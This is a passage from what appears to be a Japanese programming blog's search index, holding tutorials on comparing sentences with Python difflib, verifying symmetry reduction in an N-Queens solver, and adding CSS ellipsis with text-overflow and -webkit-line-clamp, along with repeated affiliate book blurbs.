国際パラリンピック委員会（ＩＰＣ）は３日、声明を発表し、前日２日に中立選手としての北京パラリンピック（４日開幕）への参加を容認したＲＰＣ（ロシアパラリンピック委員会）、ベラルーシの選手について、一転して出場を認めないことを発表した。ＩＰＣは声明で「ＲＰＣおよびベラルーシの選手のエントリーを拒否することを決定しました」と発表した。パーソンズ会長のコメントとして「圧倒的な数の関係者と連絡をとりオープンに議論した。彼らは私たちが決定を再考しなければ、２０２２年パラリンピック大会に重大な結果をもたらす可能性が高いと語った。複数のＮＰＣ、中には政府、チーム、アスリートからの働きかけを受けていたが、競技に参加しなさそうでもあった」と、撤回に至った経緯を説明した。\u0026#34; print(summary in original) 類似度の高い文を見つける 包含関係にある文章をスキップしたら、あとは文ごとに修正の有無を確認していきたいと思います。\n要約文の文と元の文を1文目から比較して内容が同じであれば次の文へ移動し、似ている文は違いを抽出していきます。\n似ている文を見つける方法としてdifflib.SequenceMatcher のratioというのが使えそうです。\nr = difflib.SequenceMatcher(None, 比較したい文字列1, 比較したい文字列2).ratio()\nとすると戻り値として類似度が返却されます。1.0が完全一致で0.95とかだと95%同一という意味です。\nimport difflib summary=\u0026#34;ＩＰＣは声明で「ＲＰＣおよびベラルーシの選手のエントリーを拒否することを決定しました」と発表した。\u0026#34; original=\u0026#34;ＩＰＣが「ＲＰＣおよびベラルーシの選手のエントリーを拒否することを決定しました」と発表した。\u0026#34; r = difflib.SequenceMatcher(None, summary, original).ratio() print(r) 0.9230769230769231 差分を出力する 閾値を決めて類似度の高い文が見つかったら差分を出力します。差分の出力もdifflibでできそうです。\nDifferのcompare メソッドで差分を出力できるみたいです。\ndiff = difflib.Differ() diff_array = diff.compare(summary, original) for df in diff_array : print(df) Ｉ Ｐ Ｃ + が - は - 声 - 明 - で 「 Ｒ Ｐ Ｃ お よ び ベ ラ ル ー シ の 選 手 の エ ン ト リ ー を 拒 否 す る こ と を 決 定 し ま し た 」 と 発 表 し た 。 この出力結果から「は声明で」-\u0026gt;「が」に変換するにはどうすれば良いでしょうか。\n結構大変そうなので次回にします。\n書籍の紹介 UNIXという考え方―その設計思想と哲学 単行本 – 2001/2/23 UNIX系のOSは世界で広く使われている。UNIX、Linux、FreeBSD、Solarisなど、商用、非商用を問わず最も普及したOSのひとつであろう。そしてこのOSは30年にわたって使用され続けているものでもある。なぜこれほど長い間使われてきたのか？ その秘密はUNIXに込められた数々の哲学や思想が握っている。 そもそもUNIXはMulticsという巨大なOSの開発から生まれたものだ。あまりに巨大なMulticsはその複雑さゆえに開発は遅々として進まず、その反省からケン・トンプソンが作ったのがUNIXの初めとされる。その後デニス・リッチーら多数の開発者が携わり、UNIXは発展した。本書はこのUNIXに込められた「思想と哲学」を抽出し、数々のエピソードとともにUNIXの特徴を浮き彫りにしていく。 たとえば本書で述べられているUNIXの発想のひとつとして「過度の対話式インタフェースを避ける」というものがある。UNIXのシステムは初心者には「不親切」なつくり、つまり親切な対話式のインタフェースはほとんどなく、ユーザーがコマンドを実行しようとするときはオプションをつける形をとっている。この形式はオプションをいちいち覚えねばならず、初心者に決してやさしくない。しかしこれはプログラムを小さく単純なものにし、他のプログラムとの結合性を高くする。そして結果としてUNIXのスケーラビリティと移植性の高さを支えることになっているのだ。このような形式で本書では9つの定理と10の小定理を掲げ、UNIXが何を重視し、何を犠牲にしてきたのかを明快に解説している。\n最終章にはMS-DOSなどほかのOSの思想も紹介されている。UNIXの思想が他のOSとどう違うかをはっきり知ることになるだろう。UNIXの本質を理解するうえで、UNIX信者もUNIX初心者にとっても有用な1冊だ。（斎藤牧人）\nAmazonで詳細を見る\nAmazon.co.jpアソシエイトを使用\n詳解 シェルスクリプト 大型本 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-03-02T18:25:55+09:00","image":"https://suzukiiichiro.github.io/posts/2022-03-03-01-ani/python_hua0d4d4b24f4da3a102e4452ac738b95f_23090_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-03-03-01-ani/","title":"第1回 pythonで自然言語解析（1）"},{"content":"対象解除法が正しいか検証してみよう 今回は対象解除法が正しいかどうかを検証するためプログラムを改造してクイーンを設置した場所を出力するようにしてみましょう。\nプログラムソースは以下のURLにあります。 https://github.com/suzukiiichiro/N-Queens/blob/master/03Python/py04_nqueen.py\nprintoutメソッドを利用しよう クイーンの設置場所を出力するメソッドを作って321行目と322行目の間に設置しましょう。\nABOARDに各行のクイーンの設置場所を記憶しているのでこれを利用しましょう。\npy01,py02で使っていたprintoutメソッドを修正して利用しましょう。\nprintoutメソッドを見てみましょう。\ndef printout(): \u0026#34;\u0026#34;\u0026#34;printout()\u0026#34;\u0026#34;\u0026#34; global COUNT # pylint: disable=W0603 COUNT += 1 #インクリメントはこのように書きます print(COUNT, end=\u0026#34;: \u0026#34;) #改行したくないときは, を行末にいれます for i in range(SIZE): print(ABOARD[i], end=\u0026#34;\u0026#34;) print(\u0026#34;\u0026#34;) どこを修正すれば良いでしょうか\nstotalの値を出力したいのでメソッドの引数に追加しましょう。\n引数はメソッドを宣言している()の中に書きます。\nクイーンの設置場所を出力するのでメソッド名はprintboardにしましょう。\nまた、py01,py02とは違いpy03以降はSIZEは可変になったため無くなっています。\nグローバル変数にはないためnqueenメソッドから引数でsizeを渡してあげましょう\ndef printboard(stotal,size): 冒頭でCOUNTとstotalの値を出力するようにしましょう\n改行しても良いので end=\u0026quot;: \u0026ldquo;はいらないです\npy03以降COUNTは使わなくなっているので宣言を追加する必要がありあます。\nグローバル変数宣言の一番下にCOUNT = 0 を追加しましょう\nprint(COUNT,\u0026#34;:\u0026#34;,stotal) ABOARDには各行のクイーンの設置場所が記憶されています。\nABOARD[2]=4 だったら3行目の右から5番目にクイーンが置かれています。\nちなみにメソッド内でABOARDをglobal宣言していませんが、参照するだけだったらglobal宣言いらないみたいです。\n各行がクイーンが置かれている場所「o」置かれていない場所が「-」になるようにしてみましょう。\nprintoutは各行ごとにfor文を回していましたが各セルごとに出力するためfor文を追加しましょう。\niで行、jで行の中の各セルごとにみていってクイーンが置かれている場所の時だけ「o」を出力しましょう。\nそして行の終わりに print(\u0026rdquo;\u0026quot;)で改行を入れましょう。\nfor i in range(size): for j in range(size): if ABOARD[i]==j: print(\u0026#34;o\u0026#34;, end=\u0026#34;\u0026#34;) else: print(\u0026#34;-\u0026#34;, end=\u0026#34;\u0026#34;) print(\u0026#34;\u0026#34;) ボードの出力が終わったら見やすいようにセパレータを入れてみましょう\nCOUNT = 0 #BOARD出力 def printboard(stotal,size): global COUNT COUNT += 1 print(COUNT,\u0026#34;:\u0026#34;,stotal) for i in range(size): for j in range(size): if ABOARD[i]==j: print(\u0026#34;o\u0026#34;, end=\u0026#34;\u0026#34;) else: print(\u0026#34;-\u0026#34;, end=\u0026#34;\u0026#34;) print(\u0026#34;\u0026#34;) print(\u0026#34;########\u0026#34;) 新しく関数を追記するときは決まりは特にないのですがグローバル変数宣言の直下(223行目あたり)に置きましょう。\nそして、331行目,332行目の間でprintboardメソッドを呼び出しましょう。\nstotal = symmetryops(size)\t# 対称解除法の導入 printboard(stotal,size) if stotal != 0: 出力結果を見てみよう それでは出力を見てみましょう。\npy04はn4からn15まで実行するのでn8だけ実行してみましょう。\n214行目のMAX を9にして\nminを8にして実行してみてください\npython py04_nqueen.py こんな感じで出力されるかと思います。\n1 : 8 o------- ----o--- -------o -----o-- --o----- ------o- -o------ ---o---- ######## 2 : 8 o------- -----o-- -------o --o----- ------o- ---o---- -o------ ----o--- ######## 3 : 0 o------- ------o- ---o---- -----o-- -------o -o------ ----o--- --o----- ######## 先頭の1はstotalが8なので90度回転して同じものがあるということです。\n実際に90度回転して同じでstotalが0のものがあるか探してみましょう。\n1 : 8 o------- ----o--- -------o -----o-- --o----- ------o- -o------ ---o---- ######## 1を反時計回りに90度回転させると\n以下の形になります。\n--o----- -----o-- ---o---- -o------ -------o ----o--- ------o- o------- この形のクイーンの配置があるか調べてみると\n22 : 0 --o----- -----o-- ---o---- -o------ -------o ----o--- ------o- o------- 22番目のクイーンの配置に同じものがありました。\nまたstotalも0ですので正しそうです。\nこんな感じで検証できそうですが手動で全部調べるのはちょっと辛いですよね。。。\n次回はプログラムを使って検証する方法を試してみましょう。\n書籍の紹介 UNIXという考え方―その設計思想と哲学 単行本 – 2001/2/23 UNIX系のOSは世界で広く使われている。UNIX、Linux、FreeBSD、Solarisなど、商用、非商用を問わず最も普及したOSのひとつであろう。そしてこのOSは30年にわたって使用され続けているものでもある。なぜこれほど長い間使われてきたのか？ その秘密はUNIXに込められた数々の哲学や思想が握っている。 そもそもUNIXはMulticsという巨大なOSの開発から生まれたものだ。あまりに巨大なMulticsはその複雑さゆえに開発は遅々として進まず、その反省からケン・トンプソンが作ったのがUNIXの初めとされる。その後デニス・リッチーら多数の開発者が携わり、UNIXは発展した。本書はこのUNIXに込められた「思想と哲学」を抽出し、数々のエピソードとともにUNIXの特徴を浮き彫りにしていく。 たとえば本書で述べられているUNIXの発想のひとつとして「過度の対話式インタフェースを避ける」というものがある。UNIXのシステムは初心者には「不親切」なつくり、つまり親切な対話式のインタフェースはほとんどなく、ユーザーがコマンドを実行しようとするときはオプションをつける形をとっている。この形式はオプションをいちいち覚えねばならず、初心者に決してやさしくない。しかしこれはプログラムを小さく単純なものにし、他のプログラムとの結合性を高くする。そして結果としてUNIXのスケーラビリティと移植性の高さを支えることになっているのだ。このような形式で本書では9つの定理と10の小定理を掲げ、UNIXが何を重視し、何を犠牲にしてきたのかを明快に解説している。\n最終章にはMS-DOSなどほかのOSの思想も紹介されている。UNIXの思想が他のOSとどう違うかをはっきり知ることになるだろう。UNIXの本質を理解するうえで、UNIX信者もUNIX初心者にとっても有用な1冊だ。（斎藤牧人）\nAmazonで詳細を見る\nAmazon.co.jpアソシエイトを使用\n詳解 シェルスクリプト 大型本 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-02-17T17:25:55+09:00","image":"https://suzukiiichiro.github.io/posts/2022-02-17-01-ani/chess_hub5f46a8b8fc9e255d0122f98accfe16c_94129_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-02-17-01-ani/","title":"第9回 pythonでNQueen（エイトクイーン）対象解除法（2）"},{"content":"HTMLのレイアウトでは時には文字がはみ出した際に、3点リーダーと呼ばれる「…」をつける場合があります。\n普通に記述してしまえば対応できますが、それだと文章を切ってしまったり、文が意味のわからないものになってしまい、SEOとしてはNGとなります。\nまた、文章の長さが可変の場合はレイアウトが大きく崩れてしまう原因にも繋がります。\n今回はCSSを使って3点リーダーを付ける方法を紹介します。\nこの方法を知っていれば、1行でも複数行でも3点リーダーを表示させることができるようになり、レスポンシブルデザインのようなマルチデバイスでもレイアウトが崩れずに表示させることが可能です。\n3点リーダーとは 3点リーダーとは「文章を省略する意味」と「文章に余韻を持たせたり沈黙を表現したりする意味」の2つがあります。\nHTMLで使用する場合は前の「文章を省略する」という意味で使うことが大多数です。\n1行の3点リーダーの場合 下記のようなHTMLがあり、幅をを10emとしておきましょう。\n普通に記述すると、1emでどんどん改行されてすべての文字が表示されるかと思います。\n\u0026lt;div class=\u0026#34;container\u0026#34;\u0026gt; \u0026lt;p\u0026gt;Lorem ipsum dolor sit amet, consectetur adipisicing elit...\u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; .container { background: #eee; overflow: hidden; width: 10em; padding: 10px; } 上記のHTMLとCSSを実行した結果になります。10emで改行されているのがわかるかと思います。\nこれを基準にして、三点リーダーに対応していきましょう。\nダメなやり方 - 直接htmlを修正して文字を合わせる まずはダメな3点リーダーのやり方を見てみましょう。\nそれはcssではなく、直接htmlを修正して文字を合わせるという方法です。\ncssはさきほどのままで、htmlを修正して1行かつ、末尾に三点リーダーをつけてみます。\n\u0026lt;div class=\u0026#34;container\u0026#34;\u0026gt; \u0026lt;p\u0026gt;Lorem ipsum dolo...\u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; 下記に、実行結果が表示されているかと思います。\nこれでも対応できてるじゃんと思う方もいるかと思いますが、文字が変わったりした場合、どうするのでしょうか？\n毎回数えて修正を加えるというのはかなり難しいことに気づくはずです。\n1行にして3点リーダーを表示する それでは、自動的に三点リーダーを付与してみましょう。\nまずは1行の3点リーダーを作成する方法です。\np { overflow: hidden; text-overflow: ellipsis; white-space: nowrap; } 上記のCSSを実装した結果が下記になります。\nいかがでしょうか？ちゃんと1行で3点リーダーが表示されているかと思います。\nこれであればどんな文字が来たとしても、自動的に1行表示で3点リーダーを付与することが可能です。\nただし、1行の場合はこの記述で問題ないのですが2行、3行など行数が増えたときに厄介です。\nお知らせの表示やレイアウトで2行にするというのはかなりよくあります。\n複数行でも3点リーダーを表示する そうした場合でも、問題ありません。\n-webkit-line-clampというCSSを使えば複数行でも3点リーダーを付与できます。\n-webkit-line-clampの使用には必須項目があるので注意してください。\n-webkit-line-clamp displayプロパティに-webkit-boxもしくは-webkit-inline-boxが設定されており、かつbox-orientプロパティにverticalが設定されている組み合わせのときのみ使用できます。 上記のように、-webkit-boxとbox-orient: verticalの3点セットで実装可能になるということを覚えておいください。\nそれでは実際に複数行での3点リーダーを実装してみましょう。\np { display: -webkit-box; -webkit-box-orient: vertical; -webkit-line-clamp: 2; overflow: hidden; } 上記のCSSを実装した結果が下記になります。\nさきほどのcssでは1行でしたが、今回は2行の表示で3点リーダーがついていることが確認できるかと思います。\nもちろん、3行、4行と数字を変更することで、行数を変えることもできます。\nそして、-webkit-line-clampを1とすることで、1行表示での三点リーダーも可能です。\n対応端末 -webkit-line-clampの対応端末は2022年時点でほぼすべてのブラウザで使用可能です。\nIEに関してはサポートが終了するので今回は考えないことにします。\n-webkit-line-clampはIE以外のモダンブラウザで使用可能 まとめ PCやスマホなどマルチデバイスなどに対応する際に、3点リーダーを使用する頻度はかなり多いです。\nそうした場合に、文字を複数用意したり、人力で文字を削って対応するのはナンセンスです。\n1行表示の場合はtext-overflow: ellipsis;対応。1行の他に、複数行の場合は-webkit-line-clampで対応して、より柔軟な設計を行いましょう。\nオススメの書籍 HTML5 \u0026amp; CSS3 デザインレシピ集 本書は、HTML5とCSS3によるWebサイト制作のための\u0026#34;おいしい\u0026#34;レシピ集です。 制作の現場で使われる定番テクニックから、プロ技まで余すところなく集めました。 テキスト/リスト/リンク/画像/ボックス/ テーブル/フォーム/ナビゲーション/ レイアウト/レスポンシブWebデザイン… テーマ別にレシピを整理しているので、引きやすくなっています。 「あのデザインはどう作るんだろう?」が、スグにわかります。 デザイナーからWebプログラマーまで、Web制作に携わるすべての方にお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 HTML5＋CSS3の新しい教科書　改訂新版　基礎から覚える、深く理解できる。 この商品は固定レイアウトで作成されており、タブレットなど大きいディスプレイを備えた端末で読むことに適しています。また、文字列のハイライトや検索、辞書の参照、引用などの機能が使用できません。 〈電子書籍版に関する注意事項〉 本書は固定レイアウト型の電子書籍です。リフロー型と異なりビューア機能が制限されるほか、端末によって見え方が異なりますので、ご購入前にお使いの端末にて「無料サンプル」をお試しください。 【技術の進化に左右されないWebサイトの作り方がわかる！】 Web制作のプロを目指す方に向けて、HTML5\u0026#43;CSS3を使ったWebサイトの作り方を解説した入門書の改訂版。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-02-17T16:31:05+09:00","image":"https://suzukiiichiro.github.io/posts/2022-02-17-01-wyoshi/img01_hued0e192f18d41708fb9ce45664b03bde_79209_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-02-17-01-wyoshi/","title":"CSSだけで簡単に1行や複数行の3点リーダーを付ける方法"},{"content":"対象解除法 今回から対象解除法を取り扱います。 解を見てみると左右反転だったり90度、180度回転すると同じものがあります。この性質を利用して探索回数を減らそうというアルゴリズムです。\nプログラムソースは以下のURLにあります。 https://github.com/suzukiiichiro/N-Queens/blob/master/03Python/py04_nqueen.py\nまずプログラムを実行してみましょう。\npython py04_nqueen.py で実行できます。\nn4からn15までnqueenを実行し解の数とかかった時間を出力します。\nN: Total Unique hh:mm:ss.ms 4: 2 1 0:00:00.000 5: 10 2 0:00:00.000 6: 4 1 0:00:00.000 7: 40 6 0:00:00.001 8: 92 12 0:00:00.004 9: 352 46 0:00:00.018 10: 724 92 0:00:00.080 11: 2680 341 0:00:00.372 Total が解の総数になります。Uniqueが左右反転、90度、180度回転させて同じものを同一解として取り扱ったものです。\nUniqueはTotalに比べるとかなり少なくN8ですとTotal 92に対してUnique が12です。\nUnique解からTotalの数を一定の法則で計算が可能です。\nまず全ての解は左右反転できます。\nさらに90度回転して同じであればその4倍 180度回転で同じあればその2倍となります。\nすなわち\n90度回転して同じであれば 8倍\n180度回転して同じであれば 4倍\nそれ以外は 2倍\nとなります。\nもしこれが本当であれば、全てのTotalのルートを探索する必要はなく、全てのUniqueのルートを探索しさえすればあとは単純な掛け算で解の総数を出すことができます。大幅な探索コストの削減が期待できそうです。\n本当にそうなのでしょうか？\npy04_nqueen.pyは実行結果は正解数だけしか出力していません。\nそこで、プログラムを改造してクイーンの位置も出力するようにして目で見て確かめてみましょう。\nプログラムのどの部分を改造すれば良いでしょうか？\nそれでは、プログラムを眺めてみましょう。\nグローバル変数 py03_nqueen.py と違う部分は\n221,222行目のAT,AS配列です。\nAT,ASは321行目のsymmetryopsメソッド内で左右反転、90度、180度回転して同じかチェックする箇所があるのですが。そこで使用します。\nそれ以外は同じです。\n314行目のABOARD配列はpy03_nqueen.pyでは宣言するだけで使用していませんでしたが今回からは使用します。\nABOARD配列は各行のどこにクイーンを設置したかを記憶しておく配列です。\nsymmetryopsメソッドで反転回転チェックをする際に使用します。\n各行のクイーンの場所を記憶しているのででプログラムを改造する時はこの配列を使ってクイーンの位置を出力すれば良さそうですね。\nmainメソッド py03_nquenn.pyと違う部分は337行目でABOARDをglobal宣言しているだけでそれ以外は同じです。\npy03ではABOARDを宣言しただけでプログラムのなかで使用していなかったのですが今回からは本格的に使用するためちゃんとglobal宣言しています。\nmainメソッドはn4からn15まで346行目でnqueenメソッドを呼び出して解を求め\nnごとにTOTAL,UNIQUE,かかった時間を出力します\nnqueen py03_nqueen.pyとほとんど一緒です。\nFA,FB,FCフラグで上下、左右対角線をチェックしながら再帰を利用しながら1行に1個ずつクイーンを置いていきます。\n違う部分はどこでしょう。\nまず、ABOARDを使うので314行目でABOARDをglobal宣言しています。\n次に、if row == size :で全行クイーンを置き終わった時の処理が違います。\npy03ではTOTALに1を加算していただけですが、py04はsymmetryopsメソッドを呼び出しています。\nsymmetryopsでは左右反転、90度、180度回転して同じものがあるかどうかチェックします。\nsymmetryopsの詳細な説明は後に譲りますが、同じものの中で優先順位の最も高いものだけが8(90度回転して同じ),4(180度回転して同じ),2(左右反転のみ)のスコアを返し、その他は0のスコアを返します。\n322行目でstotalが0以外の時のみUNIQUEを1加算し、stotal 2,4,8いずれかのスコアをTOTALに加算します。\n改造を加える部分は？ ざっとプログラムの概要を説明しましたが、それではどの部分に改造を加えてクイーンの設置場所を出力すると良いでしょうか？\n全行クイーンを置き終わった時が良いですよね。\nとすると 320行目の if row==size の後が良いでしょう。\nユニークなのか90,180度回転して同じものがあるのかも知りたいですから、\n321行目のsymmetryopsを実行した後が良いですね。\nそして、stotalが0の時優先順位で負けたもののクイーンの配置を出力したいですから322行目より前の方が良いですね。\nですので、321行目と322行目の間でクイーンの設置場所を出力するように改造しましょう。\n長くなったので今回はここまでで次回プログラムを改造しましょう。\n書籍の紹介 UNIXという考え方―その設計思想と哲学 単行本 – 2001/2/23 UNIX系のOSは世界で広く使われている。UNIX、Linux、FreeBSD、Solarisなど、商用、非商用を問わず最も普及したOSのひとつであろう。そしてこのOSは30年にわたって使用され続けているものでもある。なぜこれほど長い間使われてきたのか？ その秘密はUNIXに込められた数々の哲学や思想が握っている。 そもそもUNIXはMulticsという巨大なOSの開発から生まれたものだ。あまりに巨大なMulticsはその複雑さゆえに開発は遅々として進まず、その反省からケン・トンプソンが作ったのがUNIXの初めとされる。その後デニス・リッチーら多数の開発者が携わり、UNIXは発展した。本書はこのUNIXに込められた「思想と哲学」を抽出し、数々のエピソードとともにUNIXの特徴を浮き彫りにしていく。 たとえば本書で述べられているUNIXの発想のひとつとして「過度の対話式インタフェースを避ける」というものがある。UNIXのシステムは初心者には「不親切」なつくり、つまり親切な対話式のインタフェースはほとんどなく、ユーザーがコマンドを実行しようとするときはオプションをつける形をとっている。この形式はオプションをいちいち覚えねばならず、初心者に決してやさしくない。しかしこれはプログラムを小さく単純なものにし、他のプログラムとの結合性を高くする。そして結果としてUNIXのスケーラビリティと移植性の高さを支えることになっているのだ。このような形式で本書では9つの定理と10の小定理を掲げ、UNIXが何を重視し、何を犠牲にしてきたのかを明快に解説している。\n最終章にはMS-DOSなどほかのOSの思想も紹介されている。UNIXの思想が他のOSとどう違うかをはっきり知ることになるだろう。UNIXの本質を理解するうえで、UNIX信者もUNIX初心者にとっても有用な1冊だ。（斎藤牧人）\nAmazonで詳細を見る\nAmazon.co.jpアソシエイトを使用\n詳解 シェルスクリプト 大型本 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 